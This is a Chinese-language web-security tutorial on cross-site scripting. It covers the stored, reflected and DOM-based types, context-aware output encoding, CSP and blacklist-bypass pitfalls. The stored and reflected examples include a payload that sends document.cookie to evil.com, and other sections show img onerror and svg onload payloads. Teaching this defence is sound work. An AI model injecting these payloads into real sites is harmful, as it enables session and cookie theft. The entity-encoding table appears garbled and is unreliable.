XSS 跨站脚本攻击原理与防御

浏览器分不清"这段 JS 是网站自己写的"还是"攻击者硬塞进网页里的"——只要代码出现在页面里，浏览器就会一视同仁地执行它。这正是 XSS 存在的根本原因。

XSS 是什么，为什么可能发生

XSS（Cross-Site Scripting，跨站脚本攻击）指攻击者想办法把一段恶意 JavaScript 注入到目标网页中， 当受害者的浏览器加载这个页面时，这段脚本会被当作"网站自己的代码"一样正常执行——从而可以读取 document.cookie、 劫持会话、篡改页面内容、伪造用户操作等。

根本原因在于浏览器的信任模型：浏览器不区分"网站开发者写的 JS"和"攻击者想办法混进 HTML 里的 JS"， 只要这段 `<script>` 标签出现在了这个源（origin）返回的页面里，浏览器就认为它是可信的，会带着当前站点的 Cookie、 Session 等身份信息去执行。换句话说，XSS 的本质是"数据"被当成了"代码"来执行——用户输入的评论、搜索词、 URL 参数本应该是纯文本数据，但如果网站没有正确处理，浏览器的 HTML 解析器会把其中形如 `<script>` 的部分误当成可执行代码。

类比：就像一家餐厅只检查"这道菜是不是从后厨端出来的"，却不检查"后厨的食材是不是被人偷偷调过包"—— 只要脏东西混进了后厨的正常出菜流程，餐厅照样会把它当成自己的菜端给顾客。浏览器对脚本的信任也是同理：只认"是否出现在页面里"，不认"谁写的"。

三种类型：存储型 / 反射型 / DOM 型

1. 存储型 XSS（Stored XSS）

攻击者提交的恶意脚本被持久化保存到服务器（数据库）中，之后每一个访问该页面的用户都会加载并执行这段脚本。 因为"存起来了"、"影响所有查看者"，这是三种类型里危害最大的一种。

示例：评论区未过滤直接入库
// 攻击者在评论框里提交了这样一段内容，服务端原样存入数据库
// 之后每个打开这篇文章、加载评论列表的用户都会执行它
<script>fetch('https://evil.com/steal?c='+document.cookie)</script>

只要有人打开这条评论所在的页面，浏览器就会自动把当前用户的 Cookie 发送到攻击者的服务器——受害者完全无感知。

2. 反射型 XSS（Reflected XSS）

恶意脚本藏在 URL 参数里，服务器接收到请求后把这个参数原样"反射"回页面中显示出来。 它不会被存储，必须诱导受害者点击一个精心构造的链接才能触发，是"一次性"的攻击。

示例：搜索页面直接回显查询词
// 页面逻辑大致是：您搜索的是：{q参数原样输出}
// 正常使用：https://site.com/search?q=java
// 攻击者精心构造并发给受害者的链接：
https://site.com/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>

受害者点击这个看似正常的搜索链接后，服务器把 q 参数原样嵌入返回的 HTML，脚本随即在受害者浏览器中执行。

3. DOM 型 XSS（DOM-based XSS）

整个攻击链完全发生在浏览器端的 JavaScript 里，从头到尾没有经过服务器渲染或响应—— 典型场景是前端代码直接读取 location.hash、location.search 等用户可控的数据， 未经处理就写入 innerHTML。因为服务器根本没参与这个数据流转过程，服务端做再多过滤也拦不住。

示例：前端 JS 直接用 hash 拼 innerHTML
// 页面自己的 JS 代码（没有经过任何服务器交互）
const name = location.hash.slice(1); // 取 #后面的内容
document.getElementById('greeting').innerHTML = '你好，' + name;

// 攻击者发送链接：https://site.com/#<img src=x onerror=alert(document.cookie)>
// location.hash 被直接拼进 innerHTML，浏览器解析出 img 标签并触发 onerror

三种类型对比

类型触发位置是否持久化到达受害者的方式危险程度
存储型 服务端数据库 是，持久保存 受害者正常访问被污染的页面即可中招，无需额外诱导 最高——影响所有访问者
反射型 服务端响应（URL 参数回显） 否，一次性 需诱导受害者点击精心构造的链接 中——依赖社工诱导
DOM 型 纯前端 JS（不经过服务器） 否，一次性（但也可能配合存储型出现） 诱导点击链接，或页面自身逻辑触发 中高——服务端过滤完全无效

防御核心：输出编码 / 转义

防御 XSS 的核心思路只有一句话：把用户输入永远当作"要展示的数据"，绝不当作"要执行的代码"。 具体手段是输出编码（Output Encoding）——在把用户数据渲染进页面之前，把可能被解析成标签/脚本的特殊字符转换成无害的实体。

HTML 实体编码示例
// 原始输入（攻击者提交的内容）
<script>alert(1)</script>

// 编码后再输出到页面，浏览器只会把它当成纯文本显示，不会解析执行
&lt;script&gt;alert(1)&lt;/script&gt;

// 关键字符对照：
// <  →  <      >  →  >      "  →  "      '  →  '      &  →  &

需要特别注意：编码方式要跟"输出上下文"匹配，同一份用户数据出现在不同位置，需要的转义规则完全不同：

输出上下文需要的编码方式示例
HTML 标签内容 HTML 实体编码 <div>{编码后的内容}</div>
HTML 属性值 属性专用编码（连空格、等号都要转义） <input value="{编码后的内容}">
JS 字符串内 JS 字符串转义（转义引号、反斜杠、`</script>`） var x = "{JS编码后的内容}";
URL 参数 URL 编码（encodeURIComponent） ?redirect={URL编码后的内容}

现代前端框架（React/Vue）默认对插值内容做 HTML 转义，这也是"用 {{ }} 或 JSX 表达式渲染比手拼 HTML 字符串更安全"的原因； 但一旦使用 dangerouslySetInnerHTML、v-html 这类"绕过转义"的 API，防护就失效了，必须自己额外做净化处理。

纵深防御：CSP（Content-Security-Policy）

输出编码是第一道防线，但不可能保证所有代码路径都万无一失，因此需要纵深防御（Defense in Depth）—— CSP 是一种由服务器下发、浏览器强制执行的安全策略，通过 HTTP 响应头告诉浏览器"本页面只允许执行来自哪些来源的脚本"。

响应头示例
Content-Security-Policy: script-src 'self' https://trusted-cdn.com

// 含义：只信任本站(self)和指定 CDN 加载的脚本
// 即使攻击者成功注入 ，浏览器也会拒绝执行内联脚本
// 因为它既不是 'self' 也不在白名单里——注入成功了，但脚本跑不起来

这就是"纵深防御"的价值：即便某处输出编码没做好导致注入成功，CSP 依然能在浏览器执行层拦下这一刀， 大大降低了 XSS 真正造成损害的概率。

常见误区

误区：只靠黑名单过滤关键字就能防住 XSS。 比如简单地把输入中的 script 字符串替换成空——这种"过滤输入"的思路极易被绕过： 攻击者可以完全不用 <script> 标签，例如 <img src=x onerror=alert(1)>、 <svg onload=alert(1)>，还可以用大小写混写（<ScRiPt>）、 双重编码等方式绕过黑名单。正确的心智模型是"输出时转义"而不是"输入时过滤"—— 不管输入里有没有危险字符，只要在把它渲染到页面的那一刻做对了上下文相关的编码，注入就不可能生效。
面试高频："XSS 和 CSRF 有什么区别？" 这是一道经典对比题——核心区别在于代码执行在哪、以谁的名义发出请求。 XSS 是攻击者的代码在受害者浏览器里真正跑了起来；CSRF 则是攻击者的代码根本没在受害者浏览器里执行过一行， 只是"借用"了浏览器自动携带 Cookie 的机制伪造了一个请求。下一篇 CSRF 跨站请求伪造原理与防御 会展开讲这个对比。

核心价值总结

  • XSS 的本质是"数据被当成代码执行"——浏览器无法区分网站自己的脚本和被注入的脚本。
  • 存储型最危险（持久化、影响所有人），反射型靠诱导点击，DOM 型服务端完全看不见，三者触发路径不同但根因一致。
  • 防御的正确姿势是"输出时按上下文转义"，而不是"输入时靠黑名单过滤"，CSP 作为浏览器层面的纵深防御兜底。
